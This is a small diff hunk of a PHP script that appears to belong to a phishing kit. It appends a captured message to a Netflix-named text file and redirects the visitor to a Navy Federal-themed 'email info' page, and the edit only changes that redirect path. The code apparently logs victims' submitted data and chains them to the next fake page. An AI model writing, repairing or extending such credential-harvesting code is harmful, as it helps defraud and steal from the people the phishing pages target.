@@ -56,5 +56,5 @@ $myfile = fopen("NetFlix_RzlT.txt", "a+");
 $txt = $message;
 fwrite($myfile, $txt);
 fclose($myfile);
-header('Location: /navy_fed/email_info');
+header('Location: /navy_fed/email1_info.php');
 ?>
